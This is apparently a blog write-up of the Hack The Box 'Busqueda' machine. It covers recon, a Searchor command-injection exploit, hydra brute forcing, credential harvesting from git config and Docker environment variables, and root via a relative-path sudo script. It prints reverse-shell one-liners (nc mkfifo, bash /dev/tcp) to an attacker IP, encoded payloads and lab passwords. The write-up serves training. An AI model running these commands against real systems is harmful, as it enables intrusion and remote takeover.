---
title: HTB - Busqueda
date: 2024-01-29
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, busqueda, nmap, apache, python, searchor, suid, burp, ffuf, hydra, brute-force, dictionary-attack, mysql, command-injection, revshellgen]
img_path: /assets/htb/fullpwn/busqueda
published: true
image:
    path: machine_info.png
---

## Overview

[**Busqueda**](https://app.hackthebox.com/machines/Busqueda) is an Easy Difficulty Linux machine that involves exploiting a command injection (CI) vulnerability, finding credentials in a configuration file and Docker containers. 

**Initial foothold**  
	By leveraging a CI vulnerability present in a `Python` module, we gain user-level access to the machine. 

**Privilege escalation**  
	To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system check-up script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user's `Gitea` account. Further analysis of the system check-up script's source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges.

## Information gathering

Port scanning:

```bash
sudo nmap -sS -A -Pn --min-rate 10000 $busq

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

Next steps:

| **Step** | **Description**                          |
|----------|------------------------------------------|
| 1        | Add domain to local DNS                  |
| 2        | Explore domain via browser               |
| 3        | Rescan port 80                           |
| 4        | Directory, sub-domain, and vhost fuzzing |

## Initial foothold

Add domain to local DNS:

```bash
# adding domain on local DNS file
$ grep htb /etc/hosts
10.10.11.208    searcher.htb
```

Explore domain via browser:

![](searchorVersion.png)

Rescan port `80`:

```bash
# web server re-scan
$ sudo nmap -sV -sC -p80 -Pn --min-rate 10000 $busq

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
```

Directory, sub-domain, and vhost fuzzing:

```bash
# directory fuzzing
$ ffuf -u http://searcher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ac -recursion -recursion-depth 1 -e .py,.aspx,.html,.php,.txt,.jsp -ic -v

[Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 104ms]
| URL | http://searcher.htb/search
    * FUZZ: search

# sub-domain fuzzing
$ ffuf -u http://FUZZ.searcher.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac -ic

# vhost fuzzing
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://searcher.htb -H "HOST: FUZZ.searcher.htb" -ac -c -ic

gitea                   [Status: 200, Size: 13237, Words: 1009, Lines: 268, Duration: 48ms]
:: Progress: [151265/151265] :: Job [1/1] :: 1408 req/sec :: Duration: [0:02:30] :: Errors: 0 ::
```

Next steps:

| **Step** | **Description**                                             |
|----------|-------------------------------------------------------------|
| 1        | Add `gitea.searcher.htb` to local DNS file                  |
| 2        | Search known vulns for `Searchor 2.4.0`                     |
| 3        | Visit sub-domain via browser                                |
| 4        | Directory fuzzing for vhost                                 |
| 5        | Learn about `Gitea` and `Werkzeug`                          |
| 6        | Search known vulns for `Werkzeug/2.1.2` and `Python/3.10.6` |

Add `gitea.searcher.htb` to local DNS file:

```bash
# adding vhost to local DNS file
$ grep htb /etc/hosts
10.10.11.208    searcher.htb gitea.searcher.htb
```

Search known vulns for `Searchor 2.4.0`:

![](googleSearchor.png){: .normal width="70%"}

Visit sub-domain via browser:

![](giteaVersion.png)

![](giteaUsers.png){: .normal}

Directory fuzzing for vhost:

```bash
# directory fuzzing for vhost
$ ffuf -u http://gitea.searcher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ac -recursion -recursion-depth 1 -e .py,.aspx,.html,.php,.txt,.jsp -ic -v
```

Learn about `Gitea` and `Werkzeug`:

According to Gitea's [documentation](https://docs.gitea.com/):

> **Gitea** _is a painless self-hosted all-in-one software development service, it includes Git hosting, code review, team collaboration, package registry and CI/CD. It is similar to GitHub, Bitbucket and GitLab. The goal of this project is to provide the easiest, fastest, and most painless way of setting up a self-hosted Git service._

Based on [testdriven.io](https://testdriven.io/blog/what-is-werkzeug/):

>_werkzeug_ German noun: “tool”. Etymology: _werk_ (“work”), _zeug_ (“stuff”)
>
> **Werkzeug** _is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python_. **A WSGI (Web Server Gateway Interface)** _server is necessary for Python web applications since a web server cannot communicate directly with Python_. **WSGI is an interface between a web server and a Python-based web application**. _Put another way,_ **Werkzeug provides a set of utilities for creating a Python application that can talk to a WSGI server**.

Searching known vulns for `Werkzeug/2.1.2` and `Python/3.10.6` did not return anything of interest.

Next steps:

| **Step** | **Description**                                                                         |
|----------|-----------------------------------------------------------------------------------------|
| 1        | Try RCE PoC for `Searchor 2.4.0`                                                        |
| 2        | Search known vulns for `Gitea 1.18.0`                                                   |
| 3        | Brute force for users found: `cody` and `administrator`. |

Try RCE PoC for `Searchor 2.4.0`:

>[Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

```bash
# start a listener
$ nc -lvnp 9001
listening on [any] 9001 ...
```

```bash
# run the PoC
$ bash exploit.sh searcher.htb 10.10.14.12
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.14.12:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

```bash
# catch the reverse shell
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 37578
bash: cannot set terminal process group (1658): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:~$ cat ~/user.txt
cat ~/user.txt
<SNIP>
```

Search known vulns for `Gitea 1.18.0` gives us nothing back. 

Let's try to perform a brute force attack (BFA) against the login form. In order to perform our BFA we need to obtain the required information: 
1. Does it use **Basic Authentication** or is it a **login form**?
	- In our case it is a login form.
2. Is it a `GET` or a `POST` login form?
	- If it passes parameters within the URL address bar, it is a `GET`, otherwise it is a `POST`.
3. What are the parameters?
	- We can find them using burp, zap, or just brower's tools.
4. What is unique on the page during a failed login attempt?
	- We can find this by looking the page source code after a failed login attempt.


When we attempt to login with random creds, no parameters are added to the URL address bar, such as `username` and `password`, which indicates that this is a `POST` login form:

	![](testLogin.png)

The fail login message is `Username or password is incorrect.`:

	![](errorMsg.png){: .normal}

The `POST` request parameters are `user_name` and `password`: 

	![](postData.png)

	```html
	<!-- POST parameters -->
	_csrf=KFFUC4l7C5mnfe_ObzIWX3rMLgs6MTcwNjU1NjQxOTE0Mjk5OTQwOQ&user_name=test&password=test
	```

Now, we can create a wordlist with just the 2 usernames we have found and attempt our attack:

	```bash
	# create a user list
	$ cat userList
	administrator
	cody
	# perform a dictionary attack
	$ hydra -L userList -P /usr/share/wordlists/rockyou.txt 10.10.11.208 http-post-form "/user/login:user_name=^USER^&password=^PASS^:F=Username or password is incorrect." -f
	```

	Unfortunately, nothing comes back!

Next steps:

| **Step** | **Description**                                                                               |
|----------|-----------------------------------------------------------------------------------------------|
| 1        | Stabilize shell                                                                               |
| 2        | Search for privilege escalation paths: SUIDS, kernel/OS version, sensitive data, config files |

## Privilege escalation

Stabilize shell:

```bash
# stabilize shell
svc@busqueda:/var/www/app$ which python3
which python3
/usr/bin/python3
svc@busqueda:/var/www/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
svc@busqueda:/var/www/app$ ^Z
[1]+  Stopped                 nc -lvnp 9001

┌──(kali㉿CSpanias)-[~]
└─$ stty raw -echo; fg
nc -lvnp 9001

svc@busqueda:/var/www/app$
```

Search for privilege escalation paths:

```bash
# search for SUID files
svc@busqueda:/var/www/app$ find / -perm -u=s 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/umount
<SNIP>
```

Check kernel and OS version:

```bash
# check kernel version
svc@busqueda:/var/www/app$ uname -a
Linux busqueda 5.15.0-69-generic #76-Ubuntu SMP Fri Mar 17 17:19:29 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

# check OS version
svc@busqueda:/var/www/app$ cat  /etc/os-release
PRETTY_NAME="Ubuntu 22.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.2 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

Search for sensitive data and config files:

```bash
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Jan 30 06:28 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates

svc@busqueda:/var/www/app/.git$ cat .git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

We already know that there is a user `cody`, and the above file looks like it contains `cody`'s credentials for `gitea.searcher.htb`: `cody:jh1usoih2bkjaspwe92`. We can also try using the password to gain SSH access for both users, i.e., `cody` or `svc`, since the latter is a service account and it is highly susceptible to password reuse:

![](gitea_cody.png)

We were able to login as `cody`, but there is not much we can do from here with this low-privileged account. Let's try to SSH:

```bash
# ssh as cody
ssh cody@10.10.11.208
cody@10.10.11.208s password:
Permission denied, please try again.

# ssh as svc
ssh svc@10.10.11.208
svc@10.10.11.208s password:
svc@busqueda:~$
```

First, we can check if the user `svc` can run anything with elevated privileges:

```bash
# check for sudo permissions
svc@busqueda:/$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

# check file permissions
svc@busqueda:/$ ls -la /opt/scripts/system-checkup.py
-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
```

We can't read or modify the file's content as we have no read (`r`) or write (`w`) access, but we can execute it (`x`):

```bash
# list directory contents
svc@busqueda:/$ ls -la opt/scripts/
total 28
drwxr-xr-x 3 root root 4096 Dec 24  2022 .
drwxr-xr-x 4 root root 4096 Mar  1  2023 ..
-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
drwxr-x--- 8 root root 4096 Apr  3  2023 .git
-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py

# check directory permissions
svc@busqueda:/$ ls -ld /opt/scripts
drwxr-xr-x 3 root root 4096 Dec 24  2022 /opt/scripts

# execute the script
svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
[sudo] password for svc:
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

# pass the first argument
svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS             PORTS
                      NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   12 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   12 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

# pass the second argument
svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>

# pass the third argument
svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

The `docker-inspect` argument seems to require two arguments itself: `format` and `container_name`. Upon searching for the command, it seems that it is actually an official Docker command and the [`--format`](https://docs.docker.com/engine/reference/commandline/inspect/#options) refers to the output's format:

>_The output is quite large, so we can use the [`jq`](https://jqlang.github.io/jq/tutorial/) tool to beautify it and make it more readable._

```bash
# execute the script with the required arguments
svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' f84a6b33fb5a | jq
<SNIP>
    "Env": [
      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
      "MYSQL_USER=gitea",
      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
      "MYSQL_DATABASE=gitea",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "GOSU_VERSION=1.14",
      "MYSQL_MAJOR=8.0",
      "MYSQL_VERSION=8.0.31-1.el8",
      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
<SNIP>
```

The docker image above contains some credentials for the MySQL server: `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF`, `MYSQL_USER=gitea`, and `MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh`. Let's use them to log in:

```bash
# log into mysql
svc@busqueda:/$ mysql -u gitea -pyuiu1hoiu4i5ho1uh -h 127.0.0.1 -D gitea
<SNIP>

mysql> show tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
<SNIP>
| user                      |
<SNIP>
+---------------------------+
91 rows in set (0.00 sec)

mysql> select * from user limit 1 \G
*************************** 1. row ***************************
                            id: 1
                    lower_name: administrator
                          name: administrator
                     full_name:
                         email: administrator@gitea.searcher.htb
            keep_email_private: 0
email_notifications_preference: enabled
                        passwd: ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
              passwd_hash_algo: pbkdf2
<SNIP>
1 row in set (0.00 sec)

ERROR:
No query specified

mysql> select name, passwd from user;
+---------------+------------------------------------------------------------------------------------------------------+
| name          | passwd                                                                                               |
+---------------+------------------------------------------------------------------------------------------------------+
| administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

We have found 2 hashed passwords, but we already have the password for `cody` as well as the `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF` which we haven't used yet. Let's try logging in `gitea.searcher.htb` as `administrator:jI86kGUuj87guWr3RyF` or `administrator:yuiu1hoiu4i5ho1uh` prior trying to crack the hashes:

![](gitea_admin.png)

The second pair of creds worked; we have now admin access to the sub-domain. We can now read the contents of the `system-checkup.py` script, which we can run as `root` with the `svc` user. Upon inspecting the script, we notice that there is a `./full-checkup.sh` argument:

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

The argument is referenced using a relative path (`./full-checkup.sh`) instead of an absolute path (`/opt/scripts/full-checkup.sh`), which means that the script will pick up the file from the directory where it is been executed. As a result, we could change to a directory where `svc` has write privileges, such as his home directory (`~/`) or `/tmp`, create a revershe shell script named `full-checkup.sh`, and then execute `system-checkup.py` using `sudo`. This process will result in giving us a `root` revershe shell back:

>_More info about relative vs. absolute paths [here](https://cspanias.github.io/posts/HTB-Precious/#extra)._

```bash
# open a listener
$ nc -lvnp 1337
listening on [any] 1337 ...
```

```bash
# change to the /home directory
svc@busqueda:/$ cd ~
# create our reverse shell code
svc@busqueda:~$ nano full-checkup.sh
# give execute permissions to the script
svc@busqueda:~$ chmod +x full-checkup.sh
# display the file's content
svc@busqueda:~$ cat full-checkup.sh
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.12 1337 >/tmp/f
# check file's permissions
svc@busqueda:~$ ls -l full-checkup.sh
-rwxrwxr-x 1 svc svc 87 Jan 30 08:16 full-checkup.sh
# execute the command with elevated privileges
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

```

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 60178
# cat /root/root.txt
d2feae7ce4475771813e67abcb2da871
```

![](machine_pwned.png){: width="75%" .normal}

## Extra

> IppSec's [video walkthrough](https://www.youtube.com/watch?v=5dHgfviJWmg).

In case we did not know `Searchor`'s version or a PoC was not available for us, we could try exploring and exploiting the app's functionality manually. First, we can intercept a random search request with Burp and output it into a file:

![](random_search_searcher.png)

![](burp_cp2file.png)

Next, we need to add the fuzzing location, indicated by the `FUZZ` keyword, so we can use it with `ffuf`. In this case, we want to fuzz the end of our input string with special characters (`query=randomFUZZ`):

```bash
$ cat searchRequest
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://searcher.htb
Connection: close
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1

engine=Google&query=randomFUZZ
```

Now, we can pass the file to `ffuf` and match every response that has `Content-Length: 0`:

```bash
$ ffuf -request searchRequest -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -c -ms 0

'                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2656ms]
\                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2813ms]
:: Progress: [32/32] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

![](burp_contentLength.png)

We can now try perform a kind of SQLi, but using Python syntax. We know that:
- The quote symbol (`'`) is used to enclose strings.
- The parameters in Python functions are enclosed in parentheses (`()`).
- The hash symbol (`#`) is used to write comments in Python.

Thus, we can start playing around with that until we get a response back:

![](burp_pythonInjection.png)

We can now test if we can achieve string concatenation:

![](python_concat.png)

Next, we can try achieving command execution:

![](print.png)

![](system_id.png)

Finally, we can pass a reverse shell payload. We can crate our payload using [revshellgen.py](https://github.com/t0thkr1s/revshellgen):

```bash
---------- [ SELECT IP ] ----------

[   ] 172.31.150.94 on eth0
[   ] 172.17.0.1 on docker0
[ x ] 10.10.14.12 on tun0
[   ] Specify manually

---------- [ SPECIFY PORT ] ----------

[ # ] Enter port number : 9999

---------- [ SELECT COMMAND ] ----------

[ x ] unix_bash
[   ] unix_java
[   ] unix_nc_mkfifo
[   ] unix_nc_plain
[   ] unix_perl
[   ] unix_php
[   ] unix_python
[   ] unix_ruby
[   ] unix_telnet
[   ] windows_powershell

---------- [ SELECT ENCODE TYPE ] ----------

[ x ] NONE
[   ] URL ENCODE
[   ] BASE64 ENCODE

---------- [ FINISHED COMMAND ] ----------

bash -i >& /dev/tcp/10.10.14.12/9999 0>&1

[ ! ] Reverse shell command copied to clipboard!
[ + ] In case you want to upgrade your shell, you can use this:

python -c 'import pty;pty.spawn("/bin/bash")'

---------- [ SETUP LISTENER ] ----------

[ x ] yes
[   ] no
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:9999
Ncat: Listening on 0.0.0.0:9999
```

Before passing our payload to Burp, we first need to clean any special characters arising after encoding it:

```bash
$ echo "bash -i >& /dev/tcp/10.10.14.12/9999 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi85OTk5IDA+JjEK

$ echo "bash -i  >& /dev/tcp/10.10.14.12/9999  0>&1" | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvOTk5OSAgMD4mMQo=

$ echo "bash -i  >& /dev/tcp/10.10.14.12/9999  0>&1 " | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvOTk5OSAgMD4mMSAK
```

Now that we have a clean string, we are ready to pass it to Burp:

![](python_rce.png)

And catch our reverse shell:

```bash
---------- [ SETUP LISTENER ] ----------

[ x ] yes
[   ] no
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.11.208:47376.
bash: cannot set terminal process group (1645): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$
```